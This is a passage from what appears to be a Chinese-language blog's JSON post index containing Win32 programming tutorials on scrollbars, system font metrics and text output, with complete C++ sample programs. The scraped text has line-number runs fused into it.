//获取滚动条结束打印的位置 //ps.rcPaint.bottom无效矩形的底位置 iPaintEnd = min(MAX_LINE - 1, iVertPos + ps.rcPaint.bottom / cyChar); // TODO: 在此处添加使用 hdc 的任何绘图代码... for (int i = iPaintBeg, temp; i &lt; iPaintEnd; i++) &#123; x = 0; y = (i - iVertPos) * cyChar; //SetScrollPos(hWnd, SB_VERT, y, TRUE); TextOut(hdc, x, y, szBuffer[i], lstrlen(szBuffer[i])); &#125; EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"滚动条","slug":"pwcp008-滚动条","date":"2021-06-01T04:05:13.000Z","updated":"2021-06-01T11:55:39.444Z","comments":true,"path":"2021/06/01/pwcp008-滚动条/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/01/pwcp008-滚动条/","excerpt":"","text":"滚动条 在CreateWindow中加入WS_VSCROLL 添加WM_VSCROLL消息 设置滑块大小 设置滑块位置 更新客户区 WS_VSCROLL垂直滚动条 12HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW | WS_VSCROLL, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); WS_HSCROLL水平滚动条 12HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW | WS_HSCROLL, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); WM_VSCROLL消息 SB_PAGEDOWN 向下滚动一页 SB_LINEDOWN 向下滚动一行 SB_PAGEUP 向上滚动一页 SB_LINEUP 向上滚动一行 SB_TOP 滚动到顶端 SB_BOTTOM 滚动到底部 SB_THUMBPOSITION 用户有拖动滚动框 （滑块），并释放鼠标按钮。HIWORD 指示在拖动操作结束时滚动框的位置。 SB_THUMBTRACK 用户正在拖动滚动框。直到用户释放鼠标按钮，反复发送此邮件。HIWORD 指示滚动框已被拖动到的位置。 1234567891011121314151617181920212223242526case WM_VSCROLL: switch (LOWORD(wParam)) //取wParam低位 &#123; case SB_LINEUP: //向上滚动一行 iVscrollPos -= 1; break; case SB_LINEDOWN: //向下滚动一行 iVscrollPos += 1; break; case SB_PAGEDOWN: //向下滚动一页 iVscrollPos += cyClient / cyChar; break; case SB_PAGEUP: //向上滚动一页 iVscrollPos -= cyClient / cyChar; break; case SB_THUMBTRACK: //按下鼠标拖动滑块 iVscrollPos = HIWORD(wParam);//获取高位,滑块的位置 break; &#125; iVscrollPos = max(0, min(iVscrollPos, MAX_LINE - 1)); //如果不等于当前滑块位置 if(iVscrollPos != GetScrollPos(hWnd,SB_VERT)) SetScrollPos(hWnd, SB_VERT, iVscrollPos, TRUE); InvalidateRect(hWnd,NULL,TRUE); break; SetScrollRange 函数设置所指定滚动条范围的最小值和最大值 1234567BOOL SetScrollRange(HWND hWnd, // 窗口句柄int nBar, // 滚动条类型int nMinPos, // 滚动条的最小位置int nMaxPos, // 滚动条的最大位置BOOL bRedraw // 重绘标志); 1SetScrollRange(hWnd,SB_VERT,0, MAX_LINE - 1,FALSE); GetScrollPos 获取指定滚动条中滚动按钮的当前位置 hWnd：根据参数nBar值，处理滚动条控制或带有标准滚动条窗体。 nBar：指定滚动条将被检查。 SB_HORZ：水平滚动条 SB_VERT：垂直滚动条 1GetScrollPos(hWnd,SB_VERT); SetScrollPos 用于设置所指定滚动条中的滚动按钮的位置。 123456int SetScrollPos(HWNDhWnd, //窗体句柄intnBar, //滚动条intnPos, //滚动条的新位置BOOLbRedraw // 重绘标志); SB_HORZ：水平滚动条 SB_VERT：垂直滚动条 1SetScrollPos(hWnd, SB_VERT, iVscrollPos, TRUE); InvalidateRect 使整个窗口无效 一般用来重画窗口,触发WM_PAINT消息 向指定的窗体更新区域添加一个矩形，然后窗体跟新区域的这一部分将被重新绘制。 12345BOOL InvalidateRect(HWND hWnd, // 窗口句柄CONST RECT *lpRect, // 矩形指针变量BOOL bErase //是否重画); lpRect：如果为NULL，全部的窗口客户区域将被增加到更新区域中。 UpdateWindow 更新指定窗口的客户区 123BOOL UpdateWindow(HWND hWnd // 窗口的句柄); WM_SIZE 当窗口大小发生改变时触发消息 123456case WM_SIZE: //获取客户区的高度 cyClient = HIWORD(lParam); //获取客户区的宽度 cxClient = LOWORD(lParam); break; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261// 滚动条.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"滚动条.h\"#define MAX_LOADSTRING 100#define MAX_LINE 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = NULL;// MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 //WS_VSCROLL 创建垂直滚动条 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW | WS_VSCROLL, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; static TEXTMETRIC tm; //获取字体信息 static int cxChar; //字体宽度 static int cyChar; //字体高度 HDC hdc; static int iVscrollPos; //当前滑块位置 TCHAR szBuffer[1024] = &#123; 0 &#125;; static int cyClient; //当前客户区高度大小 static int cxClient; //当前客户区宽度大小 switch (message) &#123; case WM_SIZE: //获取客户区的高度 cyClient = HIWORD(lParam); //获取客户区的宽度 cxClient = LOWORD(lParam); break; case WM_VSCROLL: //获取滚动条操作的消息 switch (LOWORD(wParam)) &#123; //向上滚动一行 case SB_LINEUP: iVscrollPos -= 1; break; //向下滚动一行 case SB_LINEDOWN: iVscrollPos += 1; break; //向下滚动一页 case SB_PAGEDOWN: iVscrollPos += cyClient / cyChar; break; //向上滚动一页 case SB_PAGEUP: iVscrollPos -= cyClient / cyChar; break; //拖动滑块时 case SB_THUMBTRACK: //拖动滑块时,获取滑块位置,在wParam的高位 iVscrollPos = HIWORD(wParam); break; &#125; //最小是0,最大是MAX_LINE - 1 iVscrollPos = max(0, min(iVscrollPos, MAX_LINE - 1)); //如果当前滑块位置不等于iVscrollPos if(iVscrollPos != GetScrollPos(hWnd,SB_VERT)) SetScrollPos(hWnd, SB_VERT, iVscrollPos, TRUE); InvalidateRect(hWnd,NULL,TRUE); break; case WM_CREATE: hdc = GetDC(hWnd); GetTextMetrics(hdc, &amp;tm); cxChar = tm.tmAveCharWidth; cyChar = tm.tmHeight + tm.tmExternalLeading; ReleaseDC(hWnd,hdc); //当前滑块默认为0 iVscrollPos = 0; //设置滚动条大小 SetScrollRange(hWnd,SB_VERT,0, MAX_LINE - 1,FALSE); //设置滑块位置 SetScrollPos(hWnd,SB_VERT,iVscrollPos,TRUE); break; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; int x; int y; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... for (int i = 0, temp; i &lt; MAX_LINE; i++) &#123; x = 0; if (iVscrollPos &gt;= MAX_LINE - cyClient/cyChar) &#123; y = (i - (MAX_LINE - cyClient / cyChar)) * cyChar; //SetScrollPos(hWnd, SB_VERT, y, TRUE); &#125; else &#123; y = (i - iVscrollPos) * cyChar; &#125; _sntprintf(szBuffer,1024,TEXT(\"Hello %d \"),i + 1); TextOut(hdc, x, y,szBuffer,lstrlen(szBuffer)); &#125; EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"系统字体","slug":"pwcp007-系统字体","date":"2021-05-31T11:26:57.000Z","updated":"2021-06-08T05:12:26.228Z","comments":true,"path":"2021/05/31/pwcp007-系统字体/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/31/pwcp007-系统字体/","excerpt":"","text":"系统字体 TEXTMETRIC字体信息结构 12345678910111213141516171819202122typedef struct tagTEXTMETRIC &#123; LONG tmHeight; //字符高度LONG tmAscent; //字符上部高度(基线以上)LONG tmDescent; //字符下部高度(基线以下)LONG tmInternalLeading, //由tmHeight定义的字符高度的顶部空间数目LONG tmExternalLeading, //夹在两行之间的空间数目LONG tmAveCharWidth, //平均字符宽度LONG tmMaxCharWidth, //最宽字符的宽度LONG tmWeight; //字体的粗细轻重程度LONG tmOverhang, //加入某些拼接字体上的附加高度LONG tmDigitizedAspectX, //字体设计所针对的设备水平方向LONG tmDigitizedAspectY, //字体设计所针对的设备垂直方向BCHAR tmFirstChar; //为字体定义的第一个字符BCHAR tmLastChar; //为字体定义的最后一个字符BCHAR tmDefaultChar; //字体中所没有字符的替代字符BCHAR tmBreakChar; //用于拆字的字符BYTE tmItalic, //字体为斜体时非零BYTE tmUnderlined, //字体为下划线时非零BYTE tmStruckOut, //字体被删去时非零BYTE tmPitchAndFamily, //字体间距(低4位)和族(高4位)BYTE tmCharSet; //字体的字符集&#125; TEXTMETRIC; GetTextMetrics 把程序当前的字体信息，存放到TEXTMETRIC 1BOOL GetTextMetrics(HDC hdc, LPTEXTMETRIC lptm)； hdc：设备环境句柄。 lptm：指向结构TEXTMETRIC的指针，该结构用于获得字体信息。 1GetTextMetrics(hdc, &amp;tm); GetSystemMetrics 1int WINAPI GetSystemMetrics( __in intnIndex); 只有一个参数，称之为「索引」，这个索引有75个标识符，通过设置不同的标识符就可以获取系统分辨率、窗体显示区域的宽度和高度、滚动条的宽度和高度。 1234//获取屏幕宽度cxScreen = GetSystemMetrics(SM_CXSCREEN);//获取屏幕高度cyScreen = GetSystemMetrics(SM_CYSCREEN); SetTextAlign 为指定设备环境设置文字对齐标志 1234UINT SetTextAlign(HDC hdc, // 设备环境句柄UINT fMode // 文本对齐选项); 设置对齐方式为左对齐 SetTextAlign(hdc, TA_LEFT | TA_TOP); 设置对齐方式为右对齐 1SetTextAlign(hdc, TA_RIGHT | TA_TOP); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224// 系统字体.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"系统字体.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = NULL;//MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; static TEXTMETRIC tm; static int cxChar; //字符宽度 static int cyChar; //字符高度 static int cxCap; //一个字符的宽度 static int cxScreen, cyScreen;//屏幕宽度和高度 TCHAR szBuffer[1024] = &#123; 0 &#125;; int len; //字符串长度 HDC hdc; switch (message) &#123; case WM_CREATE: hdc = GetDC(hWnd); //把程序当前的字体信息，存放到tm GetTextMetrics(hdc, &amp;tm); //获取字符平均值 cxChar = tm.tmAveCharWidth; //获取字符高度 cyChar = tm.tmHeight + tm.tmExternalLeading + 10; //获取一个字符的宽度 cxCap = (tm.tmPitchAndFamily &amp; 1 ? 3 : 2) * cxChar / 2; //获取屏幕宽度 cxScreen = GetSystemMetrics(SM_CXSCREEN); //获取屏幕高度 cyScreen = GetSystemMetrics(SM_CYSCREEN); ReleaseDC(hWnd,hdc); break; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... TextOut(hdc,0,0,TEXT(\"SM_CXSCREEN\"),lstrlen(TEXT(\"SM_CXSCREEN\"))); TextOut(hdc, cxCap * 30, 0, TEXT(\"屏幕宽度\"), lstrlen(TEXT(\"屏幕宽度\"))); //设置对齐方式为右对齐 SetTextAlign(hdc,TA_RIGHT|TA_TOP); len = _sntprintf(szBuffer,1024,TEXT(\"%d\"),cxScreen); TextOut(hdc, cxCap * 60, 0, szBuffer,len); //设置对齐方式为左对齐 SetTextAlign(hdc,TA_LEFT | TA_TOP); TextOut(hdc, 0, cyChar, TEXT(\"SM_CYSCREEN\"), lstrlen(TEXT(\"SM_CYSCREEN\"))); TextOut(hdc, cxCap * 30, cyChar, TEXT(\"屏幕高度\"), lstrlen(TEXT(\"屏幕高度\"))); //设置对齐方式为右对齐 SetTextAlign(hdc, TA_RIGHT | TA_TOP); len = _sntprintf(szBuffer, 1024, TEXT(\"%d\"), cyScreen); TextOut(hdc, cxCap * 60, cyChar, szBuffer, len); //设置对齐方式为左对齐 SetTextAlign(hdc, TA_LEFT | TA_TOP); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"文本输出","slug":"pwcp006-文本输出","date":"2021-05-31T10:15:56.000Z","updated":"2021-05-31T10:33:18.199Z","comments":true,"path":"2021/05/31/pwcp006-文本输出/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/31/pwcp006-文本输出/","excerpt":"","text":"文本输出 设备环境句柄 BeginPaint和EndPaint用于WM_PAINT 1234case WM_PAINT: HDC hdc = BeginPaint(hWnd, &amp;ps); ... EndPaint(hWnd, &amp;ps); GetDC和releaseDC可以用在任何位置 12345hdc = GetDC(hwnd);...releaseDC(hwnd,hdc); TextOut 用当前选择的字体、背景颜色和正文颜色将一个字符串写到指定位置 1234567BOOL TextOut(HDC hdc, // 设备描述表句柄int nXStart, // 字符串的开始位置 x坐标int nYStart, // 字符串的开始位置 y坐标LPCTSTR lpString, // 字符串int cbString // 字符串中字符的个数); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190// 通盘考虑.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"通盘考虑.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);//(HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = NULL;//MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; const int iCharWidth = 18; switch (message) &#123; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); TCHAR szBuffer[1024] = &#123; 0 &#125;; // TODO: 在此处添加使用 hdc 的任何绘图代码... for (int i = 0; i &lt; 100; i++) &#123; _sntprintf(szBuffer,1024, TEXT(\"我爱你 %d\"),i + 1); TextOut(hdc, 0, iCharWidth * i,szBuffer , lstrlen(szBuffer)); &#125; EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"通盘考虑","slug":"pwcp005-通盘考虑","date":"2021-05-31T09:45:08.000Z","updated":"2021-05-31T10:16:31.903Z","comments":true,"path":"2021/05/31/pwcp005-通盘考虑/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/31/pwcp005-通盘考虑/","excerpt":"","text":"通盘考虑 Loadicon 加载图标，以供程序使用。 LoadCursor加载鼠标光标，以供程序使用。 GetStockObject 获取一个图形对象。在本例中是一个用来对窗口的背景进行重绘 的画刷。 RegisterClass 为应用程序的窗口注册一个窗口类。 MessageBox 显示消息框。 Create Window 基于窗口类创建一个窗口。 ShowWindow 在屏幕中显示窗口。 UpdateWindow 指示窗口对其自身进行重绘。 GetMessage 从消息队列获取消息。 TranslateMessage 翻译一些键盘消息。 DispatchMessage 将消息发送给窗口过程。 PlaySound 播放声音文件。 BeginPaint 标明窗口绘制开始。 GetClientRect 获取窗口客户区的尺寸。 DrawText 显示一个文本字符串。 EndPaint结束窗口绘制。 PostQuitMessage 将“退出”消息插入消息队列。 DefWindowProc 执行默认的消息处理。 大写标识符 匈牙利标记法 GetStockobject 获取预定义的备用笔、刷子、字体或者调色板的句柄。 1HGDIOBJ GetStockObject(int fnObject)； fnObject：指定对象的类型，该参数可取如下值之一； BLACK_BRUSH：黑色画刷；DKGRAY_BRUSH：暗灰色画刷； DC_BRUSH：在Windows98,Windows NT 5.0和以后版本中为纯颜色画刷，缺省色为白色，可以用SetDCBrushColor函数改变颜色，更多的信息参见以下的注释部分。 GRAY_BRUSH：灰色画刷笔； HOLLOW_BRUSH：空画刷（相当于NULL_BRUSH）； NULL_BRUSH：空画刷（相当于HOLLOW_BRUSH）； LTGRAY_BRUSH：亮灰色画刷； WHITE_BRUSH：白色画刷； BLACK_PEN：黑色钢笔； DC_PEN：在Windows98、Windows NT 5.0和以后版本中为纯色钢笔，缺省色为白色，使用SetDCPenColor函数可以改变色彩，更多的信息，参见下面的注释部分。 WHITE_PEN：白色钢笔； ANSI_FIXED_FONT：在Windows中为固定间距（等宽）系统字体； ANSI_VAR_FONT：在Windows中为变间距（比例间距）系统字体； DEVICE_DEFAUCT_FONT：在WindowsNT中为设备相关字体； DEFAULT_GUI_FONT：用户界面对象缺省字体，如菜单和对话框； 